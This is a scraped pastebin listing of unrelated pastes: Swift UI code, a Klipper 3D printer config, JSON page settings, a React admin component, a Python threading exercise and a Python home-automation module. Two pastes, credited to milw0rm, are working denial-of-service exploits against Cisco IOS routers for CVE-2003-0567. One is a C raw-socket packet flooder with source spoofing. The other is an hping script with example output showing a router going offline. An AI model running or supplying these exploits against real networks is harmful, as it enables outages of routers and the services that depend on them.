        label.isUserInteractionEnabled = true
        label.textColor = .white
        label.backgroundColor = .color111111Alpha6
        label.corner(cornerRadius: 8.0)
        label.font = .fontRegular16
        return label
    }()
    private lazy var cellTypeNameLabelBgView: UIView = {
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.addSubview(cellTypeNameLabel)
        cellTypeNameLabel.snp.makeConstraints { make in
            make.center.equalTo(view)
        }
        return view
    }()
    lazy var bookmarkedImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.tintColor = .white
        imageView.isUserInteractionEnabled = true
        let tap = UITapGestureRecognizer(target: self, action: #selector(saveStarButtonTapped(_:)))
        imageView.addGestureRecognizer(tap)
        return imageView
    }()
    private lazy var detailBgView: UIView = { // details
        let view = UIView()
        view.isUserInteractionEnabled = true
        view.corner(cornerRadius: 12)
        view.backgroundColor = .color111111Alpha6
        return view
    }()
    private lazy var reatingsStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [ratingsTextlabel, reatingStarImageView])
        reatingStarImageView.snp.makeConstraints { make in
            make.width.equalTo(20)
        }
        stack.isUserInteractionEnabled = true
        stack.axis = .horizontal
        stack.spacing = 2
        stack.distribution = .fill
        stack.alignment = .fill
        return stack
    }()
    private lazy var ratingsTextlabel: UILabel = {
        let label = UILabel()
        label.textColor = .white
        label.isUserInteractionEnabled = true
        label.font = .fontLight14
        return label
    }()

    lazy var nameStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [artistName, artistUserName])
        stack.axis = .vertical
        stack.spacing = 6
        stack.isUserInteractionEnabled = true
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var artistName: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var artistUserName: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontRegular14
        return label
    }()
    private lazy var priceLocationValueTextStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [priceLocationTextStack, priceLocationValueStack])
        stack.axis = .horizontal
        stack.isUserInteractionEnabled = true
        stack.alignment = .leading
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var priceLocationTextStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [priceText, locationText])
        stack.axis = .vertical
        stack.isUserInteractionEnabled = true
        stack.spacing = 6
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var priceLocationValueStack: UIStackView = {
        let stack = UIStackView(arrangedSubviews: [priceValue, locationValue])
        stack.axis = .vertical
        stack.isUserInteractionEnabled = true
        stack.spacing = 6
        stack.alignment = .fill
        stack.distribution = .fillEqually
        return stack
    }()
    private lazy var priceText: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.text = ""artist_home_price"".myLocalizedString
        label.font = .fontRegular14
        return label
    }()
    private lazy var priceValue: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var locationText: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.text = ""artist_home_location"".myLocalizedString
        label.font = .fontRegular14
        return label
    }()
    private lazy var locationValue: UILabel = {
        let label = UILabel()
        label.isUserInteractionEnabled = true
        label.font = .fontBold14
        return label
    }()
    private lazy var reatingStarImageView: UIImageView = {
        let imageView = UIImageView()
        imageView.image = .saveStarFill
        imageView.isUserInteractionEnabled = true
        imageView.tintColor = .yellow
        return imageView
    }()
    lazy var cellNextButton: UIButton = {
        let button = UIButton()
        button.isUserInteractionEnabled = true
        button.setImage(.arrowRight, for: .normal)
        button.tintColor = .white
        button.backgroundColor = .colorWhiteAlpha3
        button.corner(cornerRadius: 6.0)
        button.addTarget(self, action: #selector(nextButtonTapped), for: .touchUpInside)
        return button
    }()

    var starButtonHandler: ((_ index: Int) -> Void)?
    var cellNextButtonHandler: (() -> Void)?

    override func awakeFromNib() {
        super.awakeFromNib()
        // Initialization code
    }

    override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {
        super.init(style: style, reuseIdentifier: reuseIdentifier)
        setupUi()
    }

    required init?(coder: NSCoder) {
        fatalError(""init(coder:) has not been implemented"")
    }

    override func setSelected(_ selected: Bool, animated: Bool) {
        super.setSelected(selected, animated: animated)
        // Configure the view for the selected state
    }

    func setupCell(data: HomeArtistModal, index: Int) {
        self.cellTypeNameLabel.text = data.userType
        self.bgImageView.image = .artistBgImage // download image with SD Web Image
        let fullName = data.showLastName ?? true ? ""\(data.firstName  ?? K.emptyString) \(data.lastName ?? K.emptyString)"" : data.firstName ?? K.emptyString
        self.artistName.text = fullName
        self.cellNextButton.accessibilityElement(id: AccessIdentifier.artistHomeTVCNextButton + ""\(index)"", label: AccessLabel.artistHomeTVCNextButton.replaceString(with: fullName))
        self.bookmarkedImageView.image = data.isSaved ?? false ? UIImage.saveStarFill : UIImage.unSaveStar
        self.setAccessibilityOfSaveButton(data: data, index: index)
        self.bookmarkedImageView.tag = index
        self.artistName.accessibilityElement(id: AccessIdentifier.artistHomeTVCName + ""\(index)"", label: AccessLabel.artistHomeTVCName.replaceString(with: fullName ))
        self.artistUserName.text = data.userName
        self.artistUserName.accessibilityElement(id: AccessIdentifier.artistHomeTVCUserName + ""\(index)"", label: AccessLabel.artistHomeTVCUserName.replaceString(with: data.userName ?? K.emptyString))
        self.priceValue.text = ""$\(data.price ?? .zero)""
        self.priceValue.accessibilityElement(id: AccessIdentifier.artistHomeTVCPrice + ""\(index)"", label: AccessLabel.artistHomeTVCPrice.replaceString(with: ""$\(data.price ?? .zero)""))
        self.locationValue.text = data.primaryLocation?.address
        self.artistUserName.accessibilityElement(id: AccessIdentifier.artistHomeTVCLocation + ""\(index)"", label: AccessLabel.artistHomeTVCLocation.replaceString(with: data.primaryLocation?.address ?? K.emptyString))
        let ratingStar = data.rating ?? 0.0
        if ratingStar < 0.5 {
            self.reatingsStack.isHidden = true
        } else {
            self.ratingsTextlabel.text = String(data.rating ?? .zero)
            self.reatingsStack.isHidden = false
        }
        self.ratingsTextlabel.accessibilityElement(id: AccessIdentifier.artistHomeTVCReating + ""\(index)"", label: AccessLabel.artistHomeTVCReating.replaceString(with: data.rating ?? K.emptyString))
    }

    @objc func nextButtonTapped(_ sender: UIButton) {
        if let block = cellNextButtonHandler {
            block()
        }
    }

    func setAccessibilityOfSaveButton(data: HomeArtistModal, index: Int) {
        if !(data.isSaved ?? false) {
            bookmarkedImageView.accessibilityElement(id: AccessIdentifier.artistHomeTVCSaveButton + ""\(index)"", label: AccessLabel.artistHomeTVCSaveButton.replaceString(with: data.userName ?? K.emptyString))
        } else {
            bookmarkedImageView.accessibilityElement(id: AccessIdentifier.artistHomeTVCUnSaveButton + ""\(index)"", label: AccessLabel.artistHomeTVCUnSaveButton.replaceString(with: data.userName ?? K.emptyString))
        }
    }

    @objc func saveStarButtonTapped(_ tapGestureRecognizer: UITapGestureRecognizer) {
        guard let tappedImage = tapGestureRecognizer.view as? UIImageView else { return }
        if let block = starButtonHandler {
            block(tappedImage.tag)
        }
    }

    lazy var artistProfileImage: UIImageView = {
        let imageView = UIImageView(isImageViewerEnable: true)
        imageView.image = UIImage(named: ""ratingDemoProfile"")
        imageView.corner(cornerRadius: 30)
        imageView.accessibilityElement(id: AccessIdentifier.artistPersonalInfoProfileImage, label: AccessLabel.artistPersonalInfoProfileImage)
        imageView.contentMode = .scaleAspectFill
        return imageView
    }()
    private func setupUi() {
        self.contentView.isUserInteractionEnabled = true
        self.contentView.backgroundColor = .primaryColor

        self.contentView.addSubview(mainBgView)
        mainBgView.addSubview(bgImageView)
        bgImageView.addSubview(cellTypeNameLabel)
        bgImageView.addSubview(bookmarkedImageView)
        bgImageView.addSubview(detailBgView)
        detailBgView.addSubview(reatingsStack)
        detailBgView.addSubview(nameStack)
        detailBgView.addSubview(cellNextButton)
        detailBgView.addSubview(priceLocationValueTextStack)
        bgImageView.addSubview(artistProfileImage)

        mainBgView.snp.makeConstraints { make in
            make.top.equalTo(self.contentView.snp.top)
            make.bottom.equalTo(self.contentView.snp.bottom)
            make.left.equalTo(self.contentView.snp.left)
            make.right.equalTo(self.contentView.snp.right)
        }
        artistProfileImage.snp.makeConstraints { make in
            make.left.equalTo(bgImageView.left).offset(leftOffset)
            make.top.equalTo(bgImageView.top).offset(10)
            make.height.width.equalTo(60)
        }
        bgImageView.snp.makeConstraints { make in
            make.top.bottom.left.right.equalTo(mainBgView)
        }
        bookmarkedImageView.snp.makeConstraints { make in
            make.top.equalTo(bgImageView.snp.top).offset(14)
            make.right.equalTo(bgImageView.snp.right).inset(7)
            make.height.width.equalTo(24)
        }
        cellTypeNameLabel.snp.makeConstraints { make in
            make.right.equalTo(bookmarkedImageView.left).inset(-12)
            make.top.equalTo(bgImageView.snp.top).offset(10)
            make.width.equalTo(78)
            make.height.equalTo(28)
        }
        detailBgView.snp.makeConstraints { make in
            make.left.equalTo(bgImageView.snp.left).offset(16)
            make.right.equalTo(bgImageView.snp.right).inset(16)
            make.bottom.equalTo(bgImageView.snp.bottom).inset(10)
            make.height.equalTo(82)
        }
        reatingsStack.snp.makeConstraints { make in
            make.top.equalTo(detailBgView.snp.top).offset(4)
            make.left.equalTo(detailBgView.snp.left).offset(8)
            make.width.equalTo(60)
            make.height.equalTo(16)
        }
        nameStack.snp.makeConstraints { make in
            make.bottom.equalTo(detailBgView.snp.bottom).inset(12)
            make.left.equalTo(detailBgView.snp.left).offset(8)
            make.width.equalTo(96)
        }
        cellNextButton.snp.makeConstraints { make in
            make.height.width.equalTo(32)
            make.right.equalTo(detailBgView.snp.right).inset(10)
            make.centerY.equalTo(detailBgView)
        }
        priceLocationValueTextStack.snp.makeConstraints { make in
            make.left.equalTo(nameStack.snp.right).offset(20)
            make.bottom.equalTo(detailBgView.snp.bottom).inset(12)
            make.right.equalTo(cellNextButton.snp.left).inset(8)
        }
    }
}
"
vwVXujBJ,DizzyDelta,UrbanFreestyle,Python,Monday 5th of February 2024 03:18:08 AM CDT,"# Dizzy the Delta, FLSun QQ-S Pro, OEM magnetic Z Probe, BTT SKR Pico, rPi Zero2w.
# Stepper Layout A=X, B=Y, C=Z 
#
##       C
##       /\
##      /  \
##    A/____\B

#####################################################
#           Include Configurations                  #
#####################################################

[include mainsail.cfg]
[include KAMP_Settings.cfg]
#[include adxl.cfg]
[exclude_object]

#####################################################
#           Motion Configuration                    #
#####################################################

[mcu]
serial: /dev/serial/by-id/usb-1a86_USB_Serial-if00-port0
restart_method: command

[printer]
kinematics: delta
max_velocity: 500
max_accel: 5000
max_z_velocity: 200
delta_radius: 130
print_radius: 125

[delta_calibrate]
radius: 125
horizontal_move_z: 25

#####################################################
#          Stepper Configuration                    #
#####################################################

[stepper_a] #X
step_pin: gpio11
dir_pin: !gpio10
enable_pin: !gpio12
rotation_distance: 32
endstop_pin: ^gpio4
microsteps: 16
homing_speed: 60
position_endstop: 370
arm_length: 280.0

[tmc2209 stepper_a] #X
uart_pin: gpio9
tx_pin: gpio8
uart_address: 0
run_current: 0.580
stealthchop_threshold: 999999


[stepper_b] #Y
step_pin: gpio6
dir_pin: !gpio5
enable_pin: !gpio7
rotation_distance: 32
endstop_pin: ^gpio3
microsteps: 16
homing_speed: 60
position_endstop: 370
arm_length: 280.0

[tmc2209 stepper_b] #Y
uart_pin: gpio9
tx_pin: gpio8
uart_address: 2
run_current: 0.580
stealthchop_threshold: 999999


[stepper_c] #Z
step_pin: gpio19
dir_pin: gpio28
enable_pin: !gpio2
rotation_distance: 32
endstop_pin: ^gpio25
homing_speed: 60
position_endstop: 370
arm_length: 280.0

[tmc2209 stepper_c] #Z
uart_pin: gpio9
tx_pin: gpio8
uart_address: 1
run_current: 0.580
stealthchop_threshold: 999999


[extruder]
step_pin: gpio14
dir_pin: !gpio13
enable_pin: !gpio15
rotation_distance: 9
microsteps: 16
nozzle_diameter: 0.400
filament_diameter: 1.750

[tmc2209 extruder]
uart_pin: gpio9
tx_pin: gpio8
uart_address: 3
run_current: 0.650
stealthchop_threshold: 999999

#####################################################
#           Heater Configuration                    #
#####################################################

[extruder]
heater_pin: gpio23
sensor_type: EPCOS 100K B57560G104F
sensor_pin: gpio27
control: pid
pid_Kp: 14.529
pid_Ki: 0.557
pid_Kd: 94.802
min_temp: 0
max_temp: 260

[heater_bed]
heater_pin: gpio21
sensor_type: EPCOS 100K B57560G104F
sensor_pin: gpio26
control: pid
pid_Kp: 325.10
pid_Ki: 63.35
pid_Kd: 417.10
min_temp: 0
max_temp: 150

#####################################################
#          Additional Pin Configuration             #
#####################################################

[fan]
pin: gpio17

[heater_fan heatbreak_cooling_fan]
pin: gpio18

[heater_fan controller_fan]
pin: gpio20

[temperature_sensor pico]
sensor_type: temperature_mcu

[neopixel board_neopixel]
pin: gpio24
chain_count: 1
color_order: GRB
initial_RED: 0.3
initial_GREEN: 0.3
initial_BLUE: 0.3

[probe]
pin: gpio22
x_offset: 0
y_offset: 0
z_offset: 18
samples: 3
samples_result: average
sample_retract_dist: 5
samples_tolerance: 0.02
samples_tolerance_retries: 5

"
6drE4XgT,Cisco IOS - 'cisco-bug-44020.c' IPv4 Packet Denial of Service - CVE-2003-0567,FlyFar,C,Monday 5th of February 2024 03:08:45 AM CDT,"/*******************************************************/
/* cisco-bug-44020.c - Copyright by Martin Kluge (martin@elxsi.de) */
/*                                                                                            */
/* Feel free to modify this code as you like, as long as you include */
/* the above copyright statement.                                               */
/*                                                                                            */
/* Please use this code only to check your OWN cisco routers.         */
/*                                                                                            */
/*                                                                                            */
/* This exploit uses the bug in recent IOS versions to stop router    */
/* from processing traffic once the input queue is full.                    */
/*                                                                                            */
/*                                                                                            */
/* Use access control lists as described in the CISCO advisory to     */
/* protect your cisco routers:                                                       */
/*                                                                                            */
/* access-list 101 deny 53 any any                                              */
/* access-list 101 deny 55 any any                                              */
/* access-list 101 deny 77 any any                                              */
/* access-list 101 deny 103 any any                                            */
/*                                                                                            */
/* This code was only tested on linux, no warranty is or will be        */
/*                                                                                            */
/* Usage: ./cisco-bug-44020 <src ip> <dst ip> <hops> <number>  */
/* Source IP: Your source IP (or a spoofed source IP)                    */
/* Destination IP: The IP of the vulnerable cisco router                  */
/* Hops: The number of hops between you and the router,             */
/* the time to live (ttl) should be 0 when the packet                      */
/* is received by the cisco router.                                                 */
/* Number: Number of packets to send (0 = loop)                         */
/* provided.                                                                              */
/*******************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#define DEBUG

#ifndef IPPROTO_RAW
#define IPPROTO_RAW 0
#endif

/* IPv4 header */
struct ipv4_pkt_header {
unsigned int ipvhl:8; /* Version + Header length */
unsigned int type_service:8; /* TOS(Type of Service) field */
unsigned short packet_len; /* Header+Payload length */
unsigned short ident; /* Identification field */
unsigned short fragment; /* Fragment Offset field */
unsigned int time_live:8; /* TTL(Time to Live) field */
unsigned int protocol:8; /* Protocol field */
unsigned short sum; /* Checksum field */
struct in_addr src_ip; /* Source IP */
struct in_addr dst_ip; /* Destination IP */
};


char proto[] = {53,55,77,103};


/* Prototypes */
int in_cksum (unsigned short *, int, int);


/* Main function */
int main (int argc, char *argv[]) {
struct ipv4_pkt_header ipv4_hdr;
struct sockaddr_in sin;
struct timeval seed;

unsigned long src_ip, dst_ip;
int fd, hops, count, bytes;
int len=0, i=0, n=0, loop=0;

unsigned char *buf;

/* Check command line args */ 
if(argc != 5) {
fprintf(stderr, ""Usage: %s <src ip> <dst ip> <hops> <number>\n\n"", argv[0]);
return(EXIT_FAILURE);
}

src_ip = inet_addr(argv[1]);
dst_ip = inet_addr(argv[2]);
hops = atoi(argv[3]);
count = atoi(argv[4]);

if(count == 0) { loop=1; count=1; }

#ifdef DEBUG
printf(""DEBUG: Hops: %i\n"", hops);
#endif

/* Open a raw socket */
if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
fprintf(stderr, ""Error: Cannot open raw socket.\n"");
return(EXIT_FAILURE);
}

/* Build the IPv4 header */
ipv4_hdr.ipvhl = ((4 << 4) | 0x0f) & (5 | 0xf0); /* :) */
ipv4_hdr.type_service = 0x10;

#ifdef OSTYPE_BSD
ipv4_hdr.packet_len = 0x14 + len;
ipv4_hdr.fragment = 0x4000;
#else
ipv4_hdr.packet_len = htons(0x14 + len);
ipv4_hdr.fragment = htons(0x4000);
#endif

ipv4_hdr.time_live = hops;
ipv4_hdr.src_ip.s_addr = src_ip;
ipv4_hdr.dst_ip.s_addr = dst_ip;

while(n < count) {
/* Seed the random generator */
if(gettimeofday(&seed, NULL) == -1) {
fprintf(stderr, ""Error: Cannot seed the random generator.\n"");
return(EXIT_FAILURE);
}

srandom((unsigned int) (seed.tv_sec ^ seed.tv_usec));

ipv4_hdr.protocol = proto[random() % 0x4];

#ifdef DEBUG
printf(""DEBUG: Protocol: %i\n"", ipv4_hdr.protocol);
#endif

ipv4_hdr.ident = htons(random() % 0x7fff);

/* Calculate checksum */
ipv4_hdr.sum = 0x0000;
ipv4_hdr.sum = in_cksum((unsigned short *) &ipv4_hdr, 0x14 + len, 0);

#ifdef DEBUG
printf(""DEBUG: Checksum: %i\n"", ipv4_hdr.sum);
#endif

buf = malloc(0x14 + len);
memset(buf, '\0', 0x14 + len);

memcpy((unsigned char *) buf, (unsigned char *) &ipv4_hdr,
0x14 + len);

#ifdef DEBUG
printf(""DEBUG: "");
for(i=0; i < 0x14 + len; i++)
printf("" %02x"", buf[i]);
printf(""\n"");
#endif


memset(&sin, '\0', sizeof(struct sockaddr_in));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = dst_ip;

bytes = sendto(fd, buf, 0x14 + len, 0, (struct sockaddr *) &sin,
sizeof(struct sockaddr));

#ifdef DEBUG
printf(""DEBUG: Wrote %i bytes.\n"", bytes);
#endif

if(loop != 1) n++;

free(buf);
}

close(fd);
return(EXIT_SUCCESS);
}


int in_cksum(unsigned short *addr, int len, int csum) {
register int sum = csum;
unsigned short answer = 0;
register unsigned short *w = addr;
register int nleft = len;

/*
* Our algorithm is simple, using a 32 bit accumulator (sum), we add
* sequential 16 bit words to it, and at the end, fold back all the
* carry bits from the top 16 bits into the lower 16 bits.
*/
while (nleft > 1) {
sum += *w++;
nleft -= 2;
}

/* mop up an odd byte, if necessary */
if (nleft == 1) {
sum += htons(*(unsigned char *)w<<8);
}
/* add back carry outs from top 16 bits to low 16 bits */
sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
sum += (sum >> 16); /* add carry */
answer = ~sum; /* truncate to 16 bits */
return(answer);
}


// milw0rm.com [2003-07-21]
            "
8NWAUacK,update,xcage88,JSON,Monday 5th of February 2024 03:07:23 AM CDT,"{
    ""Beranda"":false,
    ""Profil"":false,
    ""Template"":false,
    ""Pekerjaan"":false,
    ""Blog"":false,
    ""Bantuan"": false
}"
nnZ4pBZ1,get,xcage88,JSON,Monday 5th of February 2024 03:06:17 AM CDT,"""data"": {
        ""page_configuration"": [
            {
                ""id"": ""d9cbf36e-bb51-11ee-a740-00155db75f50"",
                ""name"": ""Beranda"",
                ""code"": ""home"",
                ""position"": 1,
                ""is_maintenance"": false
            },
            {
                ""id"": ""cf3895ed-bb51-11ee-a740-00155db75f50"",
                ""name"": ""Profil"",
                ""code"": ""profile"",
                ""position"": 2,
                ""is_maintenance"": false
            },
            {
                ""id"": ""ea37a077-bb51-11ee-a740-00155db75f50"",
                ""name"": ""Template"",
                ""code"": ""template"",
                ""position"": 3,
                ""is_maintenance"": false
            },
            {
                ""id"": ""0169fef8-bb52-11ee-a740-00155db75f50"",
                ""name"": ""Pekerjaan"",
                ""code"": ""jobs"",
                ""position"": 4,
                ""is_maintenance"": false
            },
            {
                ""id"": ""0e3ca431-bb52-11ee-a740-00155db75f50"",
                ""name"": ""Blog"",
                ""code"": ""blogs"",
                ""position"": 5,
                ""is_maintenance"": false
            },
            {
                ""id"": ""27cbfc7f-bb52-11ee-a740-00155db75f50"",
                ""name"": ""Bantuan"",
                ""code"": ""faq"",
                ""position"": 6,
                ""is_maintenance"": false
            }
        ]
    }"
A24ABpSe,Cisco IOS - using hping Remote Denial of Service - CVE-2003-0567,FlyFar,Bash,Monday 5th of February 2024 03:05:45 AM CDT,"#!/bin/tcsh -f
#
# Remote DoS exploit against the recent Cisco IOS vuln. Cisco doc. 44020
# Vulnerable versions - all Cisco devices running IOS.
# Requirements : tcsh, and hping.
# Get hping @ www.hping.org
# 
# And you know the best part? This script actually works! Unlike the few .c's
# floating around the net. Uses swipe for the protocol bit. Also, need to be uid=0,
# OR +s ciscodos.sh because of hping opening raw sockets.
#
# Example : 
# 
# root@evicted # ping 192.168.1.1
# PING 192.168.1.1 (192.168.1.1): 56 data bytes
# 64 bytes from 192.168.1.1: icmp_seq=0 ttl=150 time=1.287 ms
# 64 bytes from 192.168.1.1: icmp_seq=1 ttl=150 time=0.817 ms
# --- 192.168.1.1 ping statistics ---
# 2 packets transmitted, 2 packets received, 0% packet loss
# round-trip min/avg/max/std-dev = 0.817/1.052/1.287/0.235 ms
#
# root@evicted # ./ciscodos.sh 192.168.1.1 0
# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes
# --- 192.168.1.1 hping statistic ---
# 19 packets tramitted, 0 packets received, 100% packet loss
# round-trip min/avg/max = 0.0/0.0/0.0 ms
# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes
# --- 192.168.1.1 hping statistic ---
# 19 packets tramitted, 0 packets received, 100% packet loss
# round-trip min/avg/max = 0.0/0.0/0.0 ms
# -------------SNIP---------------
# root@evicted # ping 192.168.1.1
# PING 192.168.1.1 (192.168.1.1): 56 data bytes
# --- 192.168.1.1 ping statistics ---
# 2 packets transmitted, 0 packets received, 100% packet loss
# -------------SNIP---------------
#
# Coded by zerash@evicted.org 
#

if ($1 == """" || $2 == """") then
echo ""usage: $0 <router hostname|address> <ttl>""
exit
endif

foreach protocol (53)
/usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto $protocol --count 76 --interval u250 --data 26
end

# milw0rm.com [2003-07-22]
            "
XZuvZ9rT,Code,xcage88,TypeScript,Monday 5th of February 2024 03:02:48 AM CDT,"import React, { useEffect, useState } from 'react'
import { useRouter } from 'next/router'
import { WebConfigurationType, WebConfigType } from '@/type/web'
import { getData, postData, putData } from '@/utility/fetch'
import { showMessage } from '@/components/alerts/showMessage';

const STATUS_COLORS = {
    active: 'green',
    maintenance: 'red',
};

const STATUS_TEXT = {
    active: 'Aktif',
    maintenance: '(Maintenance)',
};

const CheckboxSwitch = ({ label, name, checked, onChange }: any) => {
    const labelColor = checked ? STATUS_COLORS.maintenance : STATUS_COLORS.active;

    return (
        <div className=""input-banner mb-5"">
            <div className=""mb-2 flex justify-between gap-4"">
                <div className=""flex gap-2"">
                    <div className=""label-banner style={black}"">{label}</div>
                    <div className=""label-banner"" style={{ color: labelColor }}>
                        {checked ? STATUS_TEXT.maintenance : STATUS_TEXT.active}
                    </div>
                </div>

                <label className=""relative h-6 w-12"">
                    <input
                        type=""checkbox""
                        className=""custom_switch peer absolute z-10 h-full w-full cursor-pointer opacity-0""
                        id={`custom_switch_checkbox_${name}`}
                        checked={checked}
                        onChange={onChange}
                        name={name}
                    />
                    <span className={`block h-full rounded-full bg-[#ebedf2] before:absolute before:bottom-1 before:left-1 before:h-4 before:w-4 before:rounded-full before:bg-white before:transition-all before:duration-300 peer-checked:bg-primary peer-checked:before:left-7 dark:bg-dark dark:before:bg-white-dark dark:peer-checked:before:bg-white`}></span>
                </label>
            </div>
        </div>
    );
};

function WebConfig() {

    const router = useRouter()
    const [webConfig, setWebConfig] = useState<WebConfigType>()
    const [config, setConfig] = useState<WebConfigurationType[]>([])
    const [checkStatus, setCheckStatus] = useState(() => {
        const initial: any = {}
        config.forEach((item: any) => {
            initial[item?.name] = item?.is_maintenance
        })
        return initial
    })
    // const initialStatus = {
    //     Beranda: webConfig?.Beranda || false,
    //     Profil: webConfig?.Profil || false,
    //     Template: webConfig?.Template || false,
    //     Pekerjaan: webConfig?.Pekerjaan || false,
    //     Blog: webConfig?.Blog || false,
    //     Bantuan: webConfig?.Bantuan || false        
    // }
    // const [status, setStatus] = useState<any>(initialStatus)
    // config.reduce((item: any, index: any) => {
    //     item[item?.name] = item?.is_maintenance
    //     return item
    // }, {})

    useEffect(() => {
        const getDataWeb = async () => {
            try {
                const {data} = await getData('/page-configuration')
                setConfig(data.page_configuration)                
            } catch (error: any) {
                return error
            }
        }
        getDataWeb()
    },[])


    const handleChangeBox = (name: string) => {
        setCheckStatus({...checkStatus, [name]: !checkStatus[name]})
        // setStatus((prev: any) => ({
        //     ...prev,
        //     [name]: !prev[name]
        // }))
        // setConfig((prev) => prev.map((item: any) => item?.name === name ? {...item, is_maintenance: !item?.is_maintenance} : {...item}))
        // setConfig((prev: any) => prev.map((item: any) => item?.name === name))
        
    }

    // console.log(config)

    console.log(checkStatus)

    const generateDialog = async () => {        

        // console.log(checkStatus)
        try {
            await putData('/page-configuration', checkStatus)
            showMessage('Berhasil', 'success')
        } catch (error) {
            showMessage('Gagal', 'error')
        }
    }


    const handleMultiplyCheck = async (ev: React.FormEvent) => {
        ev.preventDefault()
        generateDialog()
    }


    return (
        <>
            <div className='h-full w-full p-4'>
                <div className='w-full h-full bg-white rounded-lg shadow-md border border-slate-200 p-3'>
                    <div className='w-full px-4 py-3 flex justify-between items-center mb-9'>
                        <div>
                            <h3 className='font-semibold text-3xl'>Web Configuration</h3>
                        </div>
                        {/* <button className='bg-[#376DDB] border border-[#2a5bbc] text-white font-semibold whitespace-nowrap px-5 py-2 rounded-md text-base flex items-center gap-3'
                        onClick={() => router.push('./web-config/input')}
                        >
                            <span>+</span>
                            <span>Tambah Data</span>
                        </button> */}
                    </div>
                    <div className='w-full p-3 flex flex-col gap-4'>
                        {config.map((item: any, index: any) => (
                            <CheckboxSwitch 
                                label={item?.name}
                                name={item?.name} 
                                checked={checkStatus[item?.is_maintenance]} 
                                onChange={() => handleChangeBox(item?.name)}/>
                        ))}
                        {/* <CheckboxSwitch label='Beranda' name='Beranda' checked={status.Beranda} onChange={handleChangeBox}/>
                        <CheckboxSwitch label='Profil' name='Profil' checked={status.Profil} onChange={handleChangeBox}/>
                        <CheckboxSwitch label='Template' name='Template' checked={status.Template} onChange={handleChangeBox}/>
                        <CheckboxSwitch label='Pekerjaan' name='Pekerjaan' checked={status.Pekerjaan} onChange={handleChangeBox}/>
                        <CheckboxSwitch label='Blog' name='Blog' checked={status.Blog} onChange={handleChangeBox}/>
                        <CheckboxSwitch label='Bantuan' name='Bantuan' checked={status.Bantuan} onChange={handleChangeBox}/> */}
                        <button 
                            onClick={handleMultiplyCheck}
                            className='p-2 rounded-md bg-blue-400 text-white font-semibold'
                        >
                            Simpan
                        </button>
                    </div>
                </div>
            </div>
        </>
    )
}

export default WebConfig"
TzEFJCww,republicans,nirajs,Python,Monday 5th of February 2024 02:53:24 AM CDT,"import threading
import time
from collections import deque

class DriverSelection:

    def __init__(self):  # Corrected method name
        self.republicans_queue = deque()
        self.democrats_queue = deque()
        self.cx = threading.Condition()
        # Start the dispatcher thread
        self.dispatcher_thread = threading.Thread(target=self.dispatcher, daemon=True)
        self.dispatcher_thread.start()

    def request_cab(self, party):
        with self.cx:
            if party == ""Republican"":
                self.republicans_queue.append(threading.current_thread().name)
            else:
                self.democrats_queue.append(threading.current_thread().name)

            print(f""{threading.current_thread().name} from {party} is requesting a cab."")

            self.cx.notify_all()  # Notify the dispatcher thread that a new member has arrived
            self.cx.wait()  # Wait until the cab is dispatched

    def dispatcher(self):  # Made this an instance method by adding 'self'
        while True:
            with self.cx:
                # Check for 2-2, 4-0, or 0-4 combinations
                if (len(self.republicans_queue) >= 2 and len(self.democrats_queue) >= 2) or \
                   (len(self.republicans_queue) == 4 and len(self.democrats_queue) == 0) or \
                   (len(self.republicans_queue) == 0 and len(self.democrats_queue) == 4):

                    # Dispatch a cab and clear the queues accordingly
                    if len(self.republicans_queue) >= 2 and len(self.democrats_queue) >= 2:
                        for _ in range(2): self.republicans_queue.popleft()
                        for _ in range(2): self.democrats_queue.popleft()
                        print(""Cab dispatched for 2 Republicans and 2 Democrats."")
                    elif len(self.republicans_queue) == 4:
                        for _ in range(4): self.republicans_queue.popleft()
                        print(""Cab dispatched for 4 Republicans."")
                    else:
                        for _ in range(4): self.democrats_queue.popleft()
                        print(""Cab dispatched for 4 Democrats."")

                    self.cx.notify_all()  # Notify all waiting threads that a cab has been dispatched
                else:
                    self.cx.wait()  # Wait for new members to arrive
"
rF4zj81S,semaphore,chemelli74,Python,Monday 5th of February 2024 02:25:11 AM CDT,"""""""Support for Comelit SimpleHome.""""""
import asyncio
import functools
from abc import abstractmethod
from dataclasses import dataclass
from datetime import datetime
from http.cookies import SimpleCookie
from typing import Any

import aiohttp
import pint
from yarl import URL

from .const import (
    _LOGGER,
    ALARM_AREA_STATUS,
    ALARM_AREAS,
    ALARM_ZONE_STATUS,
    ALARM_ZONES,
    BRIDGE,
    CLIMATE,
    COVER,
    IRRIGATION,
    LIGHT,
    OTHER,
    SCENARIO,
    SLEEP_BETWEEN_BRIDGE_CALLS,
    SLEEP_BETWEEN_VEDO_CALLS,
    STATE_COVER,
    STATE_ON,
    VEDO,
    WATT,
    AlarmAreaState,
    AlarmZoneState,
)
from .exceptions import CannotAuthenticate, CannotConnect, CannotRetrieveData


@dataclass
class ComelitSerialBridgeObject:
    """"""Comelit SimpleHome Serial bridge class.""""""

    index: int
    name: str
    status: int
    human_status: str
    type: str
